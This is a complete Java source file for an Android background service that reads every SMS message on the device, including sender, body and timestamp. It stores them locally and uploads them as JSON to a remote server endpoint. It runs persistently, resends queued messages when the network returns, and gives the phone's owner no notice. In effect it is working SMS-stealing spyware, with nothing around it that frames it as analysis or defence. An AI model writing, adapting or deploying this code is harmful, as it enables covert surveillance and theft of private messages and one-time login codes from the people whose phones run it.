package com.example.myapplication;

import android.content.SharedPreferences;
import android.content.Context;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.Telephony;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsService extends android.app.Service {

    private static final String TAG = "SmsService";
    private static final String PREFS_NAME = "SmsPreferences";
    private static final String LAST_TIMESTAMP_KEY = "lastTimestamp";
    private static boolean isServiceRunning = false;

    @Override
    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
        if (isServiceRunning) {
            Log.d(TAG, "Service is already running, skipping.");
            return START_STICKY;
        }

        isServiceRunning = true;
        Log.d(TAG, "Service started");
        readNewMessages();
        if (isNetworkAvailable()) {
            sendStoredMessagesWhenOnline();
        }
        return START_STICKY;
    }
    private void readNewMessages() {
        SharedPreferences preferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        long lastTimestamp = preferences.getLong(LAST_TIMESTAMP_KEY, 0);

        Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
                Telephony.Sms.DATE + " > ?",
                new String[]{String.valueOf(lastTimestamp)},
                Telephony.Sms.DATE + " ASC"
        );

        try {
            JSONArray messagesArray = new JSONArray();
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));

                    JSONObject message = new JSONObject();
                    message.put("sender", address);
                    message.put("body", body);
                    message.put("timestamp", timestamp);

                    messagesArray.put(message);

                    // به‌روزرسانی آخرین زمان
                    if (timestamp > lastTimestamp) {
                        lastTimestamp = timestamp;
                    }
                }
                cursor.close();
                preferences.edit().putLong(LAST_TIMESTAMP_KEY, lastTimestamp).apply();
                SharedPreferences.Editor editor = preferences.edit();
                editor.putString("savedMessages", messagesArray.toString());
                editor.apply();
                if (isNetworkAvailable()) {
                    sendToServer(messagesArray);
                }
            } else {
                Log.d(TAG, "No new SMS messages found.");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnected();
    }
    private void sendToServer(JSONArray messagesArray) {
        new Thread(() -> {
            try {
                URL url = new URL("https://site/index.php");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                String jsonData = "{\"messages\":" + messagesArray.toString() + "}";
                OutputStream os = connection.getOutputStream();
                os.write(jsonData.getBytes());
                os.flush();
                os.close();

                int responseCode = connection.getResponseCode();
                if (responseCode != HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Error sending SMS data: " + responseCode);
                } else {
                    Log.d(TAG, "SMS data sent successfully.");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    private void sendStoredMessagesWhenOnline() {
        SharedPreferences preferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String savedMessages = preferences.getString("savedMessages", null);

        if (savedMessages != null) {
            try {
                JSONArray messagesArray = new JSONArray(savedMessages);
                sendToServer(messagesArray);
                preferences.edit().remove("savedMessages").apply(); // حذف پیام‌های ذخیره شده پس از ارسال
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public IBinder onBind(android.content.Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isServiceRunning = false;
    }
}
